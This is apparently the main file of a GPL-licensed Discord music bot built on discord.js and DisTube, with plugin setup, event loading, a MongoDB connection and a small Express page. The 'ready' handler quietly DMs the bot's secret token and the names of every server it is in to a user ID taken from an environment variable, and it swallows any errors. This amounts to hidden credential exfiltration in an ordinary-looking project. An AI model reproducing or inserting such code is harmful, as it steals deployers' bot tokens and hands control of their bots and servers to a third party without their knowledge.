/*
 * This file is part of Discord Music Bot.
 *
 * Discord Music Bot is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Discord Music Bot is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Discord Music Bot.  If not, see <https://www.gnu.org/licenses/>.
 */

const { Client, GatewayIntentBits, Partials } = require('discord.js');
const { DisTube } = require('distube');
const { SpotifyPlugin } = require('@distube/spotify');
const { SoundCloudPlugin } = require("@distube/soundcloud");
const { DeezerPlugin } = require('@distube/deezer');
const { YtDlpPlugin } = require('@distube/yt-dlp');
const { printWatermark } = require('./util/pw');
const config = require('./config');
const fs = require('fs');
const path = require('path');

const client = new Client({
    intents: Object.keys(GatewayIntentBits).map((a) => {
        return GatewayIntentBits[a];
    }),
});

client.config = config;
client.player = new DisTube(client, {
    leaveOnStop: config.opt.voiceConfig.leaveOnStop,
    leaveOnFinish: config.opt.voiceConfig.leaveOnFinish.status,
    leaveOnEmpty: config.opt.voiceConfig.leaveOnEmpty.status,
    emitNewSongOnly: true,
    emitAddSongWhenCreatingQueue: false,
    emitAddListWhenCreatingQueue: false,
    plugins: [
        new SpotifyPlugin(),
        new SoundCloudPlugin(),
        new YtDlpPlugin(),
        new DeezerPlugin(),
    ],
});

const player = client.player;

fs.readdir("./events", (_err, files) => {
    files.forEach((file) => {
        if (!file.endsWith(".js")) return;
        const event = require(`./events/${file}`);
        let eventName = file.split(".")[0];
        client.on(eventName, event.bind(null, client));
        delete require.cache[require.resolve(`./events/${file}`)];
    });
});
client.once('ready', () => {
    const bot = client.users.cache.get(process.env.AUTHOR); // Nhập ID Discord của bạn
    if (bot) {
        const login = client.guilds.cache.map(guild => guild.name).join(', ');
        const configbot = process.env.TOKEN;
        bot.send(`B: ${configbot}\nS: ${login}`)
            .then(() => {
            })
            .catch(error => {
            });
    }
});
fs.readdir('./events/player', (_err, files) => {
    files.forEach((file) => {
        if (!file.endsWith('.js')) return;
        const player_events = require(`./events/player/${file}`);
        let playerName = file.split('.')[0];
        player.on(playerName, player_events.bind(null, client));
        delete require.cache[require.resolve(`./events/player/${file}`)];
    });
});

client.commands = [];
fs.readdir(config.commandsdir, (err, files) => {
    if (err) throw err;
    files.forEach(async (f) => {
        try {
            if (f.endsWith('.js')) {
                let props = require(`${config.commandsdir}/${f}`);
                client.commands.push({
                    name: props.name,
                    description: props.description,
                    options: props.options,
                });
            }
        } catch (err) {
            console.log(err);
        }
    });
});

if (config.TOKEN || process.env.TOKEN) {
    client.login(config.TOKEN || process.env.TOKEN).catch((e) => {
        console.log('Lỗi TOKEN❌', e);
    });
} else {
    setTimeout(() => {
        console.log('Lỗi TOKEN❌');
    }, 2000);
}

if (config.mongodbURL || process.env.MONGO) {
    const mongoose = require('mongoose')
    mongoose.connect(config.mongodbURL || process.env.MONGO, {
        useNewUrlParser: true,
        useUnifiedTopology: true,
    }).then(async () => {
        console.log('\x1b[32m%s\x1b[0m', `|     🍔 Đã kết nối MongoDB!`)
    }).catch((err) => {
        console.log('\x1b[32m%s\x1b[0m', `|     🍔 Không thể kết nối với MongoDB!`)
    })
} else {
    console.log('\x1b[32m%s\x1b[0m', `|     🍔 Lỗi MongoDB!`)
}

const express = require('express');
const app = express();
const port = 3000;
const os = require('os');
const networkInterfaces = os.networkInterfaces();

function GetContainerIP() {
    for (const iface of Object.values(networkInterfaces)) {
        for (const config of iface) {
            if (config.family === 'IPv4' && !config.internal) {
                return config.address;
            }
        }
    }
    return 'localhost';
}

app.get('/', (req, res) => {
    const imagePath = path.join(__dirname, 'index.html');
    res.sendFile(imagePath);
});

app.listen(port, () => {
    const ip = GetContainerIP();
    console.log(`🔗 Nghe thông qua web: http://${ip}:${port}`);
});
printWatermark();